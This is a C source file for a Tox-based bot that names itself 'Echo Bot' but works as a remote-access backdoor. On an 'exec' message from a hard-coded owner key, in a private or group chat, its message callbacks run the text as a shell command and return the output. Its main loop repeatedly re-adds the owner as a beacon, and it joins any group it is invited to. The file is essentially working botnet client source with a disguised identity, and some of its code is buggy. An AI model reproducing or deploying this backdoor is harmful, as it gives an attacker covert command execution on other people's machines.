#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sodium/utils.h>
#include <tox/tox.h>

//edit this, or whatever
char *ownerid =
        "0000000000000000000000000000000000000000000000000000000000000000000000000000";
char *owner =
        "0000000000000000000000000000000000000000000000000000000000000000000000000000";
char *ownershort =
        "0000000000000000000000000000000000000000000000000000000000000000";


//some tox stuff
typedef struct DHT_node {
    const char *ip;
    uint16_t port;
    const char key_hex[TOX_PUBLIC_KEY_SIZE * 2 + 1];
    unsigned char key_bin[TOX_PUBLIC_KEY_SIZE];
} DHT_node;

//we need this function i guess idk lmao
uint8_t *
hex2bin(const char *hex) {
    size_t len = strlen(hex) / 2;
    uint8_t *bin = malloc(len);

    for (size_t i = 0; i < len; ++i, hex += 2) {
        sscanf(hex, "%2hhx", &bin[i]);
    }

    return bin;
}

//this one too lol
char *
bin2hex(const uint8_t *bin, size_t length) {
    char *hex = malloc(2 * length + 1);
    char *saved = hex;
    for (int i = 0; i < length; i++, hex += 2) {
        sprintf (hex, "%02X", bin[i]);
    }
    return saved;
}

//here we go, time to register some callsbacks and shit.

//we used to make the master send the requests, now we send them ourselves, this cb def basically says do nothing on a friend request.
void
friend_request_cb(Tox *tox, const uint8_t *public_key,
                  const uint8_t *message, size_t length, void *user_data) {
    //  tox_friend_add_norequest(tox, public_key, NULL);
}

//this is the magic. when we get a message from a friend, check if it's the owner. if so, check the first word in the message and see what kind of action is requested. if it's exec, do the command and return the result back.
void
friend_message_cb(Tox *tox, uint32_t friend_num, TOX_MESSAGE_TYPE type,
                  const uint8_t *message, size_t length, void *user_data) {
    uint8_t client_id[TOX_PUBLIC_KEY_SIZE];
    tox_friend_get_public_key(tox, friend_num, client_id, NULL);
    char *mkeyhex = bin2hex(client_id, sizeof(client_id));
    printf("client_id %s \n", mkeyhex);
    printf("msg %s \n", message);
    if (strcmp(mkeyhex, ownershort) == 0) {
        char *cmd, *cmdt;
        cmdt = strdup(message);
        cmdt = strtok(cmdt, " ");
        cmd = strtok(NULL, "");
        printf("cmd: %s \n", cmd);
        printf("cmdt: %s \n", cmdt);

        if (strcmp(cmdt, "exec") == 0) {
            FILE *fp;
            uint8_t path[TOX_MAX_MESSAGE_LENGTH];
            fp = popen(cmd, "r");
            while (fgets(path, sizeof(path) - 1, fp) != NULL) {
                printf("Exec: %s \n", path);
                tox_friend_send_message(tox, friend_num,
                                        TOX_MESSAGE_TYPE_NORMAL, path,
                                        strlen(path), NULL);
            }
            pclose(fp);
        }

    }
}

//idk if groups work rn i forget. explore this
void group_invite_cb(Tox *tox, uint32_t friend_num, TOX_CONFERENCE_TYPE type, const uint8_t *cookie, size_t length, void *user_data) {
    tox_conference_join(tox, friend_num, cookie, length, NULL );
}

void
group_message_cb(Tox *tox, uint32_t group_num, uint32_t peer_number,
                 TOX_MESSAGE_TYPE type, const uint8_t *message,
                 size_t length, void *user_data) {
    uint8_t masterkey[TOX_PUBLIC_KEY_SIZE];
    tox_conference_peer_get_public_key(tox, group_num, peer_number, masterkey,
                                       NULL);
    char *mkeyhex = bin2hex(masterkey, sizeof(masterkey));
    if (strcmp(mkeyhex, ownershort) == 0) {
        char *cmd, *cmdt;
        cmdt = strdup(message);
        cmdt = strtok(cmdt, " ");
        cmd = strtok(NULL, "");
        printf("cmd: %s \n", cmd);
        printf("cmdt: %s \n", cmdt);

        if (strcmp(cmdt, "exec") == 0) {
            FILE *fp;
            uint8_t path[TOX_MAX_MESSAGE_LENGTH];
            fp = popen(cmd, "r");
            while (fgets(path, sizeof(path) - 1, fp) != NULL) {
                printf("Exec: %s \n", path);
                tox_conference_send_message(tox, group_num,
                                        TOX_MESSAGE_TYPE_NORMAL, path,
                                        strlen(path), NULL);
            }
            pclose(fp);
        }

    }

}

//we need this for tox or something idk go read the headers in c-toxcore
void
self_connection_status_cb(Tox *tox, TOX_CONNECTION connection_status,
                          void *user_data) {
    switch (connection_status) {
        case TOX_CONNECTION_NONE:
            printf("Offline\n");
            break;
        case TOX_CONNECTION_TCP:
            printf("Online, using TCP\n");
            break;
        case TOX_CONNECTION_UDP:
            printf("Online, using UDP\n");
            break;
    }
}

//do our shit
int
main() {
    Tox *tox = tox_new(NULL, NULL);

    const char *name = "Echo Bot";
    tox_self_set_name(tox, name, strlen(name), NULL);

    const char *status_message = "Echoing your messages";
    tox_self_set_status_message(tox, status_message, strlen(status_message),
                                NULL);
//bootstrap the tox network. we don't need tox network, we dont need these nodes, but they are there and they work so why not use them
    DHT_node nodes[] = {
	    {
		       "85.172.30.117",
		          33445,
			     "8E7D0B859922EF569298B4D261A8CCB5FEA14FB91ED412A7603A585A25698832"
				     ,{0}},
	    {
		       "85.143.221.42",
		          33445,
			     "DA4E4ED4B697F2E9B000EEFE3A34B554ACD3F45F5C96EAEA2516DD7FF9AF7B43"
				     ,{0}},
	    {
		       "tox.verdict.gg",
		          33445,
			     "1C5293AEF2114717547B39DA8EA6F1E331E5E358B35F9B6B5F19317911C5F976"
				     ,{0}},
	    {
		       "78.46.73.141",
		          33445,
			     "02807CF4F8BB8FB390CC3794BDF1E8449E9A8392C5D3F2200019DA9F1E812E46"
				     ,{0}},
	    {
		       "tox.initramfs.io",
		          33445,
			     "3F0A45A268367C1BEA652F258C85F4A66DA76BCAA667A49E770BCC4917AB6A25"
				     ,{0}},
	    {
		       "46.229.52.198",
		          33445,
			     "813C8F4187833EF0655B10F7752141A352248462A567529A38B6BBF73E979307"
				     ,{0}},
	    {
		       "144.217.167.73",
		          33445,
			     "7E5668E0EE09E19F320AD47902419331FFEE147BB3606769CFBE921A2A2FD34C"
				     ,{0}},
	    {
		       "tox.abilinski.com",
		          33445,
			     "10C00EB250C3233E343E2AEBA07115A5C28920E9C8D29492F6D00B29049EDC7E"
				     ,{0}},
	    {
		       "tox.novg.net",
		          33445,
			     "D527E5847F8330D628DAB1814F0A422F6DC9D0A300E6C357634EE2DA88C35463"
				     ,{0}},
	    {
		       "95.31.18.227",
		          33445,
			     "257744DBF57BE3E117FE05D145B5F806089428D4DCE4E3D0D50616AA16D9417E"
				     ,{0}},
	    {
		       "198.199.98.108",
		          33445,
			     "BEF0CFB37AF874BD17B9A8F9FE64C75521DB95A37D33C5BDB00E9CF58659C04F"
				     ,{0}},
	    {
		       "tox.kurnevsky.net",
		          33445,
			     "82EF82BA33445A1F91A7DB27189ECFC0C013E06E3DA71F588ED692BED625EC23"
				     ,{0}},
	    {
		       "87.118.126.207",
		          33445,
			     "0D303B1778CA102035DA01334E7B1855A45C3EFBC9A83B9D916FFDEBC6DD3B2E"
				     ,{0}},
	    {
		       "81.169.136.229",
		          33445,
			     "E0DB78116AC6500398DDBA2AEEF3220BB116384CAB714C5D1FCD61EA2B69D75E"
				     ,{0}},
	    {
		       "205.185.115.131",
		          53,
			     "3091C6BEB2A993F1C6300C16549FABA67098FF3D62C6D253828B531470B53D68"
				     ,{0}},
	    {
		       "tox2.abilinski.com",
		          33445,
			     "7A6098B590BDC73F9723FC59F82B3F9085A64D1B213AAF8E610FD351930D052D"
				     ,{0}},
	    {
		       "floki.blog",
		          33445,
			     "6C6AF2236F478F8305969CCFC7A7B67C6383558FF87716D38D55906E08E72667"
				     ,{0}},
	    {
		       "51.158.146.76",
		          33445,
			     "E940D8FA9B07C1D13EA4ECF9F06B66F565F1CF61F094F60C67FDC8ADD3F4BA59"
				     ,{0}},
	    {
		       "46.101.197.175",
		          33445,
			     "CD133B521159541FB1D326DE9850F5E56A6C724B5B8E5EB5CD8D950408E95707"
				     ,{0}},
	    {
		       "tox1.mf-net.eu",
		          33445,
			     "B3E5FA80DC8EBD1149AD2AB35ED8B85BD546DEDE261CA593234C619249419506"
				     ,{0}},
	    {
		       "tox2.mf-net.eu",
		          33445,
			     "70EA214FDE161E7432530605213F18F7427DC773E276B3E317A07531F548545F"
				     ,{0}},
	    {
		       "46.146.229.184",
		          33445,
			     "94750E94013586CCD989233A621747E2646F08F31102339452CADCF6DC2A760A"
				     ,{0}},
	    {
		       "tox.neuland.technology",
		          33445,
			     "15E9C309CFCB79FDDF0EBA057DABB49FE15F3803B1BFF06536AE2E5BA5E4690E"
				     ,{0}},
	    {
		       "37.48.122.22",
		          33445,
			     "1B5A8AB25FFFB66620A531C4646B47F0F32B74C547B30AF8BD8266CA50A3AB59"
				     ,{0}},
	    {
		       "185.14.30.213",
		          443,
			     "2555763C8C460495B14157D234DD56B86300A2395554BCAE4621AC345B8C1B1B"
				     ,{0}},
	    {
		       "109.111.178.181",
		          33445,
			     "25890C0139ECF9F217C72058D9E43E8873F6755D24374525623944915C98A903"
				     ,{0}},
	    {
		       "218.28.170.22",
		          33445,
			     "DBACB7D3F53693498398E6B46EF0C063A4656EB02FEFA11D72A60BAFA8DF7B59"
				     ,{0}},
	    {
		       "194.36.190.71",
		          33445,
			     "B62F1878BD08EDD34E4D7B0D66F9E74CC7BDE4BEA2C95E130DAADCFF9BCB4F6D"
				     ,{0}},
	    {
		       "94.45.70.19",
		          33445,
			     "CE049A748EB31F0377F94427E8E3D219FC96509D4F9D16E181E956BC5B1C4564"
				     ,{0}},
	    {
		       "185.66.13.169",
		          33445,
			     "A44A024DA1299A85B91E3A64B9D19C7F331D0073DD2FAAF1361C127B5D909E3D"
				     ,{0}}
	        };
//do the bootstrap i think idk
    for (size_t i = 0; i < sizeof(nodes) / sizeof(DHT_node); i++) {
        sodium_hex2bin(nodes[i].key_bin, sizeof(nodes[i].key_bin),
                       nodes[i].key_hex, sizeof(nodes[i].key_hex) - 1, NULL,
                       NULL, NULL);
        tox_bootstrap(tox, nodes[i].ip, nodes[i].port, nodes[i].key_bin, NULL);
    }

    uint8_t tox_id_bin[TOX_ADDRESS_SIZE];
    tox_self_get_address(tox, tox_id_bin);

    char tox_id_hex[TOX_ADDRESS_SIZE * 2 + 1];
    sodium_bin2hex(tox_id_hex, sizeof(tox_id_hex), tox_id_bin,
                   sizeof(tox_id_bin));

    for (size_t i = 0; i < sizeof(tox_id_hex) - 1; i++) {
        tox_id_hex[i] = toupper(tox_id_hex[i]);
    }

    printf("Tox ID: %s\n", tox_id_hex);
//register our callbacks
    tox_callback_friend_request(tox, friend_request_cb);
    tox_callback_friend_message(tox, friend_message_cb);
    tox_callback_conference_invite(tox, group_invite_cb);
    tox_callback_conference_message(tox, group_message_cb);

    tox_callback_self_connection_status(tox, self_connection_status_cb);

    int waiter = 0;
    uint8_t *ownerbin;
    char *pingmsg = "hi lmao";
    ownerbin = hex2bin(owner);
    while (1) {
        tox_iterate(tox, NULL);
        if (waiter > 200) {
            tox_friend_delete(tox, owner, NULL);
            printf("Ping: %s \n", owner);
            tox_friend_add(tox, ownerbin, pingmsg, sizeof(pingmsg), NULL);
            waiter = 0;
        }
        usleep(tox_iteration_interval(tox) * 1000);
        waiter++;
    }

    tox_kill(tox);

    return 0;
}
